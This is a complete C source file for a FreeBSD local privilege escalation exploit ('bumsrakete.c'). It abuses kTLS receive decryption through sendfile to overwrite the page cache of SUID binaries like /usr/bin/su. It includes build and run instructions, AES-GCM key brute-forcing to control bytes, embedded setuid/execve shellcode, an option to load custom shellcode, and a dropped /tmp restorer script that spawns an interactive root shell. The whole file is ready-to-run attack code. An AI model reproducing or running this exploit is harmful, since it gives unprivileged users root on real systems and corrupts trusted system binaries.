/*
 * bumsrakete.c — single-file FreeBSD kTLS-RX EXTPG LPE against suid binaries.
 *
 * Generic across su versions: parses the target ELF to locate the entry
 * point's file offset (works for both ET_EXEC and PIE/ET_DYN, and for any
 * PT_LOAD layout), then writes a 36-byte amd64 shellcode there via
 * cumulative-XOR multi-round writes and execs the SUID binary.
 *
 * Build:
 *     cc -O3 -march=native -maes -msse4.1 -o bumsrakete bumsrakete.c -lcrypto
 *
 * Run as an unprivileged user:
 *     ./bumsrakete                # defaults to /usr/bin/su
 *     ./bumsrakete /usr/bin/passwd
 *     ./bumsrakete /usr/bin/su /tmp/myshellcode.bin
 *
 * On success: drops a root shell via execve("/usr/bin/su") -> shellcode.
 *
 * The exploit modifies suid-binarie's page-cache (and, on UFS with the right
 * write-through state, may persist to disk).
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/stat.h>
#include <sys/ktls.h>
#include <sys/endian.h>
#include <sys/ioctl.h>
#include <sys/elf64.h>
#include <sys/elf_common.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <crypto/cryptodev.h>
#include <wmmintrin.h>
#include <smmintrin.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <time.h>

#define KEY_LEN      16
#define SALT_LEN     4
#define EXPL_IV_LEN  8
#define TAG_LEN      16
#define TLS_HDR_LEN  5
#define RECORD_W     240   /* > MLEN(~224) so EXTPG bypasses mb_unmapped_compress */
#define STRIDE       1

/*
 * The shellcode execve's a small /bin/sh restorer that bumsrakete.c drops at this
 * path before corrupting the target binary.  The path is mode 0700, owned by
 * the exploiting user, created O_EXCL — only the user (and root) can write
 * to or execute it.  After the restorer rewrites the target binary's
 * original entry-point bytes from /tmp/.lpe_orig, it execs an interactive
 * /bin/sh and unlinks both helper files.
 *
 * Path must be exactly 8 bytes incl. NUL so it fits one movabs imm64.
 */
#define RESTORER_PATH "/tmp/.x"

/* Default payload: amd64 FreeBSD shellcode -- setuid(0); execve(RESTORER_PATH). */
static const uint8_t default_shellcode[] = {
	0x31, 0xff,                                   /* xor edi, edi    */
	0x31, 0xc0,                                   /* xor eax, eax    */
	0xb0, 0x17,                                   /* mov al, 23 (SYS_setuid) */
	0x0f, 0x05,                                   /* syscall         */
	0x31, 0xd2,                                   /* xor edx, edx    */
	0x52,                                         /* push rdx        */
	0x48, 0xb8, 0x2f, 0x74, 0x6d, 0x70, 0x2f,
	0x2e, 0x78, 0x00,                             /* movabs rax, "/tmp/.x\0" */
	0x50,                                         /* push rax        */
	0x48, 0x89, 0xe7,                             /* mov rdi, rsp    */
	0x52,                                         /* push rdx        */
	0x57,                                         /* push rdi        */
	0x48, 0x89, 0xe6,                             /* mov rsi, rsp    */
	0x31, 0xc0,                                   /* xor eax, eax    */
	0xb0, 0x3b,                                   /* mov al, 59 (SYS_execve) */
	0x0f, 0x05,                                   /* syscall         */
};

/* ========================== AES-NI primitives ============================ */

static inline __m128i aes128_assist(__m128i tmp, __m128i tmp2)
{
	__m128i tmp3;
	tmp2 = _mm_shuffle_epi32(tmp2, 0xff);
	tmp3 = _mm_slli_si128(tmp, 0x4);  tmp = _mm_xor_si128(tmp, tmp3);
	tmp3 = _mm_slli_si128(tmp3, 0x4); tmp = _mm_xor_si128(tmp, tmp3);
	tmp3 = _mm_slli_si128(tmp3, 0x4); tmp = _mm_xor_si128(tmp, tmp3);
	return _mm_xor_si128(tmp, tmp2);
}

static void aes128_expand(const uint8_t key[16], __m128i rk[11])
{
	__m128i t = _mm_loadu_si128((const __m128i *)key);
	rk[0] = t;
	rk[1] = aes128_assist(t, _mm_aeskeygenassist_si128(t, 0x01)); t = rk[1];
	rk[2] = aes128_assist(t, _mm_aeskeygenassist_si128(t, 0x02)); t = rk[2];
	rk[3] = aes128_assist(t, _mm_aeskeygenassist_si128(t, 0x04)); t = rk[3];
	rk[4] = aes128_assist(t, _mm_aeskeygenassist_si128(t, 0x08)); t = rk[4];
	rk[5] = aes128_assist(t, _mm_aeskeygenassist_si128(t, 0x10)); t = rk[5];
	rk[6] = aes128_assist(t, _mm_aeskeygenassist_si128(t, 0x20)); t = rk[6];
	rk[7] = aes128_assist(t, _mm_aeskeygenassist_si128(t, 0x40)); t = rk[7];
	rk[8] = aes128_assist(t, _mm_aeskeygenassist_si128(t, 0x80)); t = rk[8];
	rk[9] = aes128_assist(t, _mm_aeskeygenassist_si128(t, 0x1b)); t = rk[9];
	rk[10]= aes128_assist(t, _mm_aeskeygenassist_si128(t, 0x36));
}

static inline __m128i aes128_encrypt_blk(const __m128i rk[11], __m128i in)
{
	__m128i x = _mm_xor_si128(in, rk[0]);
	x = _mm_aesenc_si128(x, rk[1]); x = _mm_aesenc_si128(x, rk[2]);
	x = _mm_aesenc_si128(x, rk[3]); x = _mm_aesenc_si128(x, rk[4]);
	x = _mm_aesenc_si128(x, rk[5]); x = _mm_aesenc_si128(x, rk[6]);
	x = _mm_aesenc_si128(x, rk[7]); x = _mm_aesenc_si128(x, rk[8]);
	x = _mm_aesenc_si128(x, rk[9]);
	return _mm_aesenclast_si128(x, rk[10]);
}

/* Brute-force (K, salt, iv8) so AES_K(salt || iv8 || ctr=2)[0] == want.
 * Expected 256 attempts.  Sub-millisecond per round on AES-NI hardware. */
static int find_kiv_1byte(uint8_t want, uint8_t key[KEY_LEN],
    uint8_t salt[SALT_LEN], uint8_t iv8[EXPL_IV_LEN])
{
	uint8_t blk[16];
	__m128i rk[11];
	if (RAND_bytes(key, KEY_LEN) != 1) return -1;
	if (RAND_bytes(salt, SALT_LEN) != 1) return -1;
	memcpy(blk, salt, 4);
	blk[12]=0; blk[13]=0; blk[14]=0; blk[15]=2;
	aes128_expand(key, rk);
	for (uint64_t counter = 0; counter < (uint64_t)1 << 20; counter++) {
		memcpy(blk + 4, &counter, 8);
		__m128i in  = _mm_loadu_si128((__m128i *)blk);
		__m128i out = aes128_encrypt_blk(rk, in);
		uint8_t got = (uint8_t)_mm_cvtsi128_si32(out);
		if (got == want) {
			memcpy(iv8, blk + 4, EXPL_IV_LEN);
			return 0;
		}
	}
	return -1;
}

/* Compute the first `n` bytes of AES-CTR keystream (ctr starts at 2). */
static void compute_ks(const uint8_t key[KEY_LEN], const uint8_t salt[SALT_LEN],
    const uint8_t iv8[EXPL_IV_LEN], int n, uint8_t *ks)
{
	__m128i rk[11];
	aes128_expand(key, rk);
	uint8_t blk[16];
	memcpy(blk, salt, 4);
	memcpy(blk + 4, iv8, 8);
	for (int i = 0; i * 16 < n; i++) {
		int ctr = 2 + i;
		blk[12]=(ctr>>24)&0xff; blk[13]=(ctr>>16)&0xff;
		blk[14]=(ctr>>8)&0xff;  blk[15]=ctr&0xff;
		__m128i in  = _mm_loadu_si128((__m128i *)blk);
		__m128i out = aes128_encrypt_blk(rk, in);
		uint8_t obytes[16];
		_mm_storeu_si128((__m128i *)obytes, out);
		int copy = (n - i*16 < 16) ? (n - i*16) : 16;
		memcpy(ks + i*16, obytes, copy);
	}
}

/* AES-128-GCM encrypt -> ct + tag (via OpenSSL EVP, which uses AES-NI under
 * the hood for the bulk transform but is convenient for the GMAC step). */
static int gcm_encrypt(const uint8_t key[KEY_LEN], const uint8_t iv12[12],
    const uint8_t *aad, int aad_len,
    const uint8_t *pt, int pt_len,
    uint8_t *ct_out, uint8_t tag_out[TAG_LEN])
{
	EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
	int outlen, final_len;
	if (!ctx) return -1;
	if (EVP_EncryptInit_ex(ctx, EVP_aes_128_gcm(), NULL, NULL, NULL) != 1) goto err;
	if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_AEAD_SET_IVLEN, 12, NULL) != 1) goto err;
	if (EVP_EncryptInit_ex(ctx, NULL, NULL, key, iv12) != 1) goto err;
	if (aad_len > 0 && EVP_EncryptUpdate(ctx, NULL, &outlen, aad, aad_len) != 1) goto err;
	if (EVP_EncryptUpdate(ctx, ct_out, &outlen, pt, pt_len) != 1) goto err;
	if (EVP_EncryptFinal_ex(ctx, ct_out + outlen, &final_len) != 1) goto err;
	if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_AEAD_GET_TAG, TAG_LEN, tag_out) != 1) goto err;
	EVP_CIPHER_CTX_free(ctx);
	return 0;
err:
	EVP_CIPHER_CTX_free(ctx);
	return -1;
}

static void build_aad(uint8_t aad[13], uint64_t seq, uint16_t plen)
{
	uint64_t s = htobe64(seq);
	uint16_t l = htons(plen);
	memcpy(aad, &s, 8);
	aad[8] = 0x17; aad[9] = 0x03; aad[10] = 0x03;
	memcpy(aad + 11, &l, 2);
}

/* ====================== loopback + per-round driver ====================== */

static int setup_loopback_pair(int *cfd_out, int *sfd_out)
{
	int lst, cl, sv, one = 1;
	struct sockaddr_in addr;
	socklen_t alen;
	lst = socket(AF_INET, SOCK_STREAM, 0);
	if (lst < 0) return -1;
	setsockopt(lst, SOL_SOCKET, SO_REUSEADDR, &one, sizeof one);
	memset(&addr, 0, sizeof addr);
	addr.sin_family = AF_INET; addr.sin_len = sizeof addr;
	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	if (bind(lst, (struct sockaddr *)&addr, sizeof addr) < 0) { close(lst); return -1; }
	if (listen(lst, 1) < 0) { close(lst); return -1; }
	alen = sizeof addr;
	getsockname(lst, (struct sockaddr *)&addr, &alen);
	cl = socket(AF_INET, SOCK_STREAM, 0);
	if (cl < 0) { close(lst); return -1; }
	if (connect(cl, (struct sockaddr *)&addr, sizeof addr) < 0) { close(lst); close(cl); return -1; }
	sv = accept(lst, NULL, NULL);
	close(lst);
	if (sv < 0) { close(cl); return -1; }
	*cfd_out = cl; *sfd_out = sv;
	return 0;
}

static int do_round(int ffd, off_t file_off,
    const uint8_t key[KEY_LEN], const uint8_t salt[SALT_LEN],
    const uint8_t iv[EXPL_IV_LEN], const uint8_t tag[TAG_LEN])
{
	int cfd = -1, sfd = -1;
	if (setup_loopback_pair(&cfd, &sfd) < 0) return -1;

	struct tls_enable en;
	memset(&en, 0, sizeof en);
	en.cipher_key = (void *)key;     en.cipher_key_len = KEY_LEN;
	en.iv = (void *)salt;            en.iv_len = SALT_LEN;
	en.cipher_algorithm = CRYPTO_AES_NIST_GCM_16;
	en.tls_vmajor = TLS_MAJOR_VER_ONE; en.tls_vminor = TLS_MINOR_VER_TWO;
	if (setsockopt(sfd, IPPROTO_TCP, TCP_RXTLS_ENABLE, &en, sizeof en) < 0) {
		close(cfd); close(sfd); return -1;
	}

	uint8_t hdr[TLS_HDR_LEN + EXPL_IV_LEN];
	hdr[0]=0x17; hdr[1]=0x03; hdr[2]=0x03;
	uint16_t reclen = htons(EXPL_IV_LEN + RECORD_W + TAG_LEN);
	memcpy(hdr + 3, &reclen, 2);
	memcpy(hdr + TLS_HDR_LEN, iv, EXPL_IV_LEN);

	struct iovec hi = { .iov_base = hdr,         .iov_len = sizeof hdr };
	struct iovec ti = { .iov_base = (void *)tag, .iov_len = TAG_LEN };
	struct sf_hdtr hdtr = { .headers = &hi, .hdr_cnt = 1,
	                        .trailers = &ti, .trl_cnt = 1 };
	off_t sent = 0;
	if (sendfile(ffd, cfd, file_off, RECORD_W, &hdtr, &sent, 0) < 0) {
		close(cfd); close(sfd); return -1;
	}

	struct pollfd pfd = { .fd = sfd, .events = POLLIN };
	(void)poll(&pfd, 1, 1000);
	uint8_t recv_buf[1024]; char cbuf[128];
	struct msghdr msg = {0};
	struct iovec riov = { .iov_base = recv_buf, .iov_len = sizeof recv_buf };
	msg.msg_iov = &riov; msg.msg_iovlen = 1;
	msg.msg_control = cbuf; msg.msg_controllen = sizeof cbuf;
	ssize_t got = recvmsg(sfd, &msg, MSG_DONTWAIT);
	close(cfd); close(sfd);
	return (got > 0) ? 0 : -1;
}

/* ============================= ELF parsing ============================== */

/* Returns the file offset of the entry point, or -1 on error.  Works for
 * both ET_EXEC and ET_DYN (PIE), and for any number of PT_LOAD segments. */
static off_t elf_entry_file_offset(int fd, uint64_t *entry_vaddr_out)
{
	Elf64_Ehdr eh;
	if (pread(fd, &eh, sizeof eh, 0) != (ssize_t)sizeof eh) return -1;
	if (memcmp(eh.e_ident, ELFMAG, SELFMAG) != 0) return -1;
	if (eh.e_ident[EI_CLASS] != ELFCLASS64) return -1;
	if (eh.e_type != ET_EXEC && eh.e_type != ET_DYN) return -1;

	uint64_t e_entry = eh.e_entry;
	if (entry_vaddr_out) *entry_vaddr_out = e_entry;

	for (uint16_t i = 0; i < eh.e_phnum; i++) {
		Elf64_Phdr ph;
		off_t phoff = (off_t)eh.e_phoff + (off_t)i * eh.e_phentsize;
		if (pread(fd, &ph, sizeof ph, phoff) != (ssize_t)sizeof ph) return -1;
		if (ph.p_type != PT_LOAD) continue;
		if (e_entry >= ph.p_vaddr &&
		    e_entry <  ph.p_vaddr + ph.p_memsz)
			return (off_t)ph.p_offset + (off_t)(e_entry - ph.p_vaddr);
	}
	return -1;
}

/* =============================== driver ================================= */

static double now_secs(void)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return ts.tv_sec + ts.tv_nsec * 1e-9;
}

/* Convert a numeric st_flags value to chflags(1)-compatible comma-separated
 * keyword form (e.g. 0x20800 -> "schg,uarch").  Falls back to "0" if no
 * recognized flags are set so the resulting chflags invocation clears the
 * fileinstead of leaving it unchanged. */
static void flags_to_keywords(uint32_t f, char *buf, size_t buflen)
{
	buf[0] = 0;
	struct { uint32_t bit; const char *kw; } map[] = {
		{ 0x00000001, "nodump"  }, { 0x00000002, "uchg"   },
		{ 0x00000004, "uappnd"  }, { 0x00000008, "opaque" },
		{ 0x00000010, "uunlnk"  }, { 0x00000020, "usystem"},
		{ 0x00000040, "sparse"  }, { 0x00000080, "offline"},
		{ 0x00000100, "reparse" }, { 0x00000200, "urdonly"},
		{ 0x00008000, "hidden"  }, { 0x00000800, "uarch"  },
		{ 0x00010000, "arch"    }, { 0x00020000, "schg"   },
		{ 0x00040000, "sappnd"  }, { 0x00100000, "snapshot"},
		{ 0x00200000, "sunlnk"  },
	};
	for (size_t i = 0; i < sizeof map / sizeof map[0]; i++) {
		if (f & map[i].bit) {
			if (buf[0]) strlcat(buf, ",", buflen);
			strlcat(buf, map[i].kw, buflen);
		}
	}
	if (!buf[0]) strlcpy(buf, "0", buflen);
}

/* Write a small /bin/sh restorer script to RESTORER_PATH.  It dd's the saved
 * original bytes back over the target binary's entry-point region, restores
 * the file's chflags state, removes its own traces, and execs an interactive
 * /bin/sh — all running as root (the SUID-derived euid the shellcode just
 * promoted to ruid via setuid(0)).
 *
 * The corruption window is the WHOLE span actually touched by the chain of
 * sendfile-decrypt rounds = (N-1)*STRIDE + RECORD_W bytes, not just the N
 * controlled shellcode bytes — every record's 240-byte payload is XORed
 * with a fresh keystream and leaves random bytes after the last controlled
 * position.  We save and restore the full span. */
static int write_restorer(const char *target, off_t entry_off, int sc_len,
    int span, uint32_t orig_flags, const uint8_t *orig_bytes)
{
	int fd = open("/tmp/.lpe_orig",
	    O_WRONLY | O_CREAT | O_TRUNC, 0600);
	if (fd < 0) { perror("open .lpe_orig"); return -1; }
	if (write(fd, orig_bytes, span) != span) {
		perror("write .lpe_orig"); close(fd); return -1;
	}
	close(fd);

	/* O_EXCL: fail if the path already exists, preventing another user
	 * from squatting on /tmp/.x and tricking root into running their
	 * code. */
	int rfd = open(RESTORER_PATH,
	    O_WRONLY | O_CREAT | O_TRUNC | O_EXCL, 0700);
	if (rfd < 0) {
		fprintf(stderr,
		    "[-] open(" RESTORER_PATH "): %s — remove it and retry\n",
		    strerror(errno));
		return -1;
	}
	FILE *f = fdopen(rfd, "w");
	if (!f) { perror("fdopen"); close(rfd); return -1; }
	char flag_kw[128];
	flags_to_keywords(orig_flags, flag_kw, sizeof flag_kw);
	fprintf(f,
	    "#!/bin/sh\n"
	    "# restorer dropped by bumsrakete.c\n"
	    "chflags 0 '%s' 2>/dev/null\n"
	    "dd if=/tmp/.lpe_orig of='%s' bs=1 seek=%lld count=%d "
	        "conv=notrunc 2>/dev/null\n"
	    "chflags %s '%s' 2>/dev/null\n"
	    "rm -f /tmp/.lpe_orig " RESTORER_PATH "\n"
	    "echo '[+] %s restored (%d bytes at offset %lld, flags=%s), root shell:'\n"
	    "id\n"
	    "exec /bin/sh -i\n",
	    target, target,
	    (long long)entry_off, span,
	    flag_kw, target,
	    target, span, (long long)entry_off, flag_kw);
	fclose(f);
	/* Re-tighten in case the umask widened it; redundant with O_EXCL 0700
	 * above but defends against fdopen quirks. */
	(void)chmod(RESTORER_PATH, 0700);
	return 0;
}

int main(int argc, char **argv)
{
	setvbuf(stdout, NULL, _IONBF, 0);

	const char *target = (argc >= 2) ? argv[1] : "/usr/bin/su";
	const uint8_t *sc = default_shellcode;
	size_t sc_len = sizeof default_shellcode;
	uint8_t sc_buf[4096];

	if (argc >= 3) {
		int sfd = open(argv[2], O_RDONLY);
		if (sfd < 0) { perror("open shellcode"); return 1; }
		ssize_t n = read(sfd, sc_buf, sizeof sc_buf);
		close(sfd);
		if (n <= 0) { fprintf(stderr, "shellcode empty\n"); return 1; }
		sc = sc_buf; sc_len = (size_t)n;
	}

	printf("[+] FreeBSD kTLS-RX EXTPG LPE — target=%s, shellcode=%zu bytes\n",
	    target, sc_len);
	printf("[+] running as ");
	fflush(stdout);
	if (system("id") != 0) {/* ignore */}

	int ffd = open(target, O_RDONLY);
	if (ffd < 0) { perror("open target"); return 1; }

	uint64_t entry_vaddr;
	off_t entry_off = elf_entry_file_offset(ffd, &entry_vaddr);
	if (entry_off < 0) {
		fprintf(stderr, "[-] could not parse ELF / find entry point\n");
		return 1;
	}
	printf("[+] entry vaddr=0x%llx, file offset=0x%llx\n",
	    (unsigned long long)entry_vaddr, (unsigned long long)entry_off);

	struct stat st;
	if (fstat(ffd, &st) != 0) { perror("fstat"); return 1; }
	uint32_t orig_flags = st.st_flags;
	printf("[+] current st_flags=0x%x (preserved for restore)\n", orig_flags);

	int N = (int)sc_len;
	int total_span = (N - 1) * STRIDE + RECORD_W;
	uint8_t *page = calloc(1, total_span);
	if (!page) { fprintf(stderr, "oom\n"); return 1; }
	if (pread(ffd, page, total_span, entry_off) != total_span) {
		fprintf(stderr, "[-] short read of %d bytes at offset 0x%llx\n",
		    total_span, (unsigned long long)entry_off);
		return 1;
	}
	printf("[+] orig bytes at entry: ");
	for (int i = 0; i < 16 && i < N; i++) printf("%02x ", page[i]);
	printf("...\n");

	/* Stage the restorer script + original bytes BEFORE corrupting the
	 * target.  The shellcode execve's RESTORER_PATH after setuid(0). */
	if (write_restorer(target, entry_off, N, total_span,
	    orig_flags, page) != 0)
		return 1;
	printf("[+] restorer staged at " RESTORER_PATH
	    " (will dd %d bytes from /tmp/.lpe_orig back at offset %lld)\n",
	    total_span, (long long)entry_off);

	double t0 = now_secs();
	for (int k = 0; k < N; k++) {
		uint8_t want = page[k * STRIDE] ^ sc[k];

		uint8_t key[KEY_LEN], salt[SALT_LEN], iv[EXPL_IV_LEN];
		if (find_kiv_1byte(want, key, salt, iv) != 0) {
			fprintf(stderr, "[-] round %d brute force failed\n", k);
			return 1;
		}

		/* Compute the full keystream and apply it to our in-memory copy. */
		uint8_t ks[RECORD_W], pt[RECORD_W], ct[RECORD_W], tag[TAG_LEN];
		compute_ks(key, salt, iv, RECORD_W, ks);
		for (int i = 0; i < RECORD_W; i++) {
			ct[i] = page[k * STRIDE + i];
			pt[i] = ct[i] ^ ks[i];
		}
		uint8_t iv12[12]; memcpy(iv12, salt, 4); memcpy(iv12 + 4, iv, 8);
		uint8_t aad[13]; build_aad(aad, 0, RECORD_W);
		uint8_t ct_check[RECORD_W];
		if (gcm_encrypt(key, iv12, aad, sizeof aad,
		    pt, RECORD_W, ct_check, tag) != 0) {
			fprintf(stderr, "[-] gcm round %d failed\n", k); return 1;
		}
		if (memcmp(ct_check, ct, RECORD_W) != 0) {
			fprintf(stderr, "[-] tag sanity fail round %d\n", k); return 1;
		}
		for (int i = 0; i < RECORD_W; i++) page[k * STRIDE + i] ^= ks[i];

		if (do_round(ffd, entry_off + k * STRIDE, key, salt, iv, tag) < 0) {
			fprintf(stderr, "[-] do_round %d failed\n", k); return 1;
		}

		if ((k & 7) == 0 || k == N - 1)
			printf("[+] round %2d/%d   page[%d]=%02x\n",
			    k + 1, N, k * STRIDE, page[k * STRIDE]);
	}
	printf("[+] all %d rounds done in %.2fs\n", N, now_secs() - t0);

	uint8_t after[64];
	if (pread(ffd, after, sizeof after, entry_off) == sizeof after) {
		printf("[+] post-corruption entry bytes: ");
		for (int i = 0; i < (int)sc_len && i < (int)sizeof after; i++)
			printf("%02x ", after[i]);
		printf("\n");
	}
	close(ffd);

	printf("[+] executing %s — shellcode runs at entry, setuid(0)+execve(/bin/sh)\n",
	    target);
	fflush(stdout);
	execl(target, target, (char *)NULL);
	perror("execl");
	return 1;
}
